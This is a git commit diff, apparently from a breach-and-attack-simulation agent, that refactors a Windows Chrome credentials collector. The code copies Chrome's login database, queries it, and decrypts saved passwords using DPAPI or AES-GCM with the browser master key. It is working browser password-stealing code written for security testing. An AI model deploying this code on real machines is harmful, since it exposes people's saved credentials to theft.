50c823f25465a5a253a5477e21418ba186569443
Shreya Malviya <shreya.malviya@gmail.com>
2023-09-08 18:55:12 +0530

    Chrome: Improve code quality in WindowsCredentialsDatabaseProcessor
    - replace str paths with pathlib.Path
    - add proper logging
    - add comments
    - rename variables to make more sense
    - clean up the code

--- monkey/agent_plugins/credentials_collectors/chrome/src/windows_credentials_database_processor.py
+++ monkey/agent_plugins/credentials_collectors/chrome/src/windows_credentials_database_processor.py
@@ -1,9 +1,9 @@
 import logging
-import os
 import shutil
 import sqlite3
 import string
 import tempfile
+from pathlib import Path
 from typing import Collection, List, Optional, Tuple
 
 from Crypto.Cipher import AES
@@ -18,7 +18,6 @@ from .windows_decryption import win32crypt_unprotect_data
 logger = logging.getLogger(__name__)
 
 
-# TODO: use pathlib.Path, not str
 class WindowsCredentialsDatabaseProcessor:
     def __call__(
         self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
@@ -28,14 +27,19 @@ class WindowsCredentialsDatabaseProcessor:
         # TODO: make interruptible
         for database_path in database_paths:
             # copy database before querying it to bypass lock errors
-            path = self._copy_db(database_path.database_file_path)
-            if path:
+            temporary_database_path = self._copy_database(database_path.database_file_path)
+            if temporary_database_path:
                 try:
-                    credentials.extend(self._export_credentials(path, database_path.master_key))
+                    credentials.extend(
+                        self._export_credentials(
+                            temporary_database_path=temporary_database_path,
+                            master_key=database_path.master_key,
+                        )
+                    )
                 except Exception as err:
                     logger.debug(f"{err}")
 
-                self._clean_file(path)
+                self._remove_temporary_database(temporary_database_path)
 
         return [
             # TODO: fix assumption that identity is a username, could be an email ID;
@@ -45,7 +49,7 @@ class WindowsCredentialsDatabaseProcessor:
             for username, password in set(credentials)
         ]
 
-    def _copy_db(self, database_path) -> Optional[str]:
+    def _copy_database(self, database_path: Path) -> Optional[Path]:
         root_dir = [
             tempfile.gettempdir(),
             # NOTE: (This is not relevant ATM since we only steal credentials from
@@ -59,15 +63,25 @@ class WindowsCredentialsDatabaseProcessor:
 
         for r in root_dir:
             try:
-                temp = os.path.join(r, random_name)
-                shutil.copy(database_path, temp)
-                return temp
+                temp_path = Path(r) / Path(random_name)
+                shutil.copy(database_path, temp_path)
+
+                logger.debug(
+                    f'Copied database at "{database_path}" to temporary location "{temp_path}"'
+                )
+
+                return temp_path
             except Exception as err:
-                logger.debug(f"{err}")
+                logger.error(
+                    "Encountered an exception while trying to copy database "
+                    f'at "{database_path}" to temporary location "{temp_path}": {err}'
+                )
 
         return None
 
-    def _export_credentials(self, db_path, master_key=None):
+    def _export_credentials(
+        self, temporary_database_path: Path, master_key: Optional[bytes] = None
+    ) -> List[Tuple[str, str]]:
         """
         Exports credentials from the given database
         """
@@ -77,57 +91,69 @@ class WindowsCredentialsDatabaseProcessor:
         credentials: List[Tuple[str, str]] = []
 
         try:
-            conn = sqlite3.connect(db_path)
-            cursor = conn.cursor()
-            cursor.execute(database_query)
+            conn = sqlite3.connect(temporary_database_path)
         except Exception as err:
-            logger.debug(f"{err}")
+            logger.error(f"Encountered an exception while connecting to database: {err}")
             return credentials
 
-        for login, password in cursor.fetchall():
+        cursor = conn.cursor()
+        try:
+            cursor.execute(database_query)
+        except Exception as err:
+            logger.error(f"Encountered an exception while executing query on database: {err}")
+            return credentials
+
+        for username, password in cursor.fetchall():
             try:
                 # decrypt the password
                 if password and password.startswith(b"v10"):  # chromium > v80
                     if master_key:
-                        password = self._decrypt_v80(password, master_key)
+                        password = self._decrypt_password_v80(password, master_key)
                 else:
                     try:
-                        password_bytes = win32crypt_unprotect_data(
-                            password,
-                        )
-                    except AttributeError:
-                        try:
-                            password_bytes = win32crypt_unprotect_data(
-                                password,
-                            )
-                        except Exception:
-                            password_bytes = None
+                        password_bytes = win32crypt_unprotect_data(password)
+                    except Exception:
+                        password_bytes = None
 
                     if password_bytes not in [None, False]:
                         password = password_bytes.decode("utf-8")
 
-                if not login and not password:
+                if not username and not password:
                     continue
 
-                credentials.append((login, password))
+                credentials.append((username, password))
+
             except Exception as err:
-                logger.debug(f"{err}")
+                logger.error(
+                    f"Encountered an exception while trying to decrypt the password: {err}"
+                )
+
+                # even if the password couldn't be decrypted, we don't want to lose the username
+                credentials.append((username, ""))
 
         conn.close()
 
         return credentials
 
-    def _decrypt_v80(self, buff, master_key) -> str:
-        iv = buff[3:15]
-        payload = buff[15:]
+    def _decrypt_password_v80(self, encrypted_password: str, master_key: bytes) -> str:
+        """
+        Decrypts passwords stolen from browsers with Chromium > v80
+        """
+
+        iv = encrypted_password[3:15]
+        payload = encrypted_password[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
+
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
 
         return decrypted_pass
 
-    def _clean_file(self, db_path):
+    def _remove_temporary_database(self, temporary_database_path: Path):
         try:
-            os.remove(db_path)
-        except Exception as err:
-            logger.debug(f"{err}")
+            temporary_database_path.unlink()
+            logger.debug(f'Removed temporary database file located at "{temporary_database_path}"')
+        except FileNotFoundError:
+            logger.error(
+                f'Could not remove temporary database file located at "{temporary_database_path}"'
+            )
